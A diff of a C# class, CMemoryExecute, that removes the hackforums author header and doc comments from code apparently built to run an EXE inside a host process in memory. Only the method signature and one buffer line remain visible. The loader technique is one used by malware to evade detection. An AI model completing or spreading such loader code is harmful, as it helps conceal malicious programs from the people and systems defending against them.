@@ -1,31 +1,11 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-/*
-* Title: CMemoryExecute.cs
-* Description: Runs an EXE in memory using native WinAPI. Very optimized and tiny.
-*
-* Developed by: affixiate
-* Release date: December 3, 2010
-* Released on: http://hackforums.net
-* Credits:
-*    MSDN (http://msdn.microsoft.com)
-*    NtInternals (http://undocumented.ntinternals.net)
-*    Pinvoke (http://pinvoke.net)
-*    
-* Comments: If you use this code, I require you to give me credits. Don't be a ripper! ;]
-*/
 
 // ReSharper disable InconsistentNaming
 public static unsafe class CMemoryExecute
 {
-    /// <summary>
-    /// Runs an EXE (which is loaded in a byte array) in memory.
-    /// </summary>
-    /// <param name="exeBuffer">The EXE buffer.</param>
-    /// <param name="hostProcess">Full path of the host process to run the buffer in.</param>
-    /// <param name="optionalArguments">Optional command line arguments.</param>
-    /// <returns></returns>
+   
     public static bool Run(byte[] exeBuffer, string hostProcess, string optionalArguments = "")
     {
         var IMAGE_SECTION_HEADER = new byte[0x28]; // pish
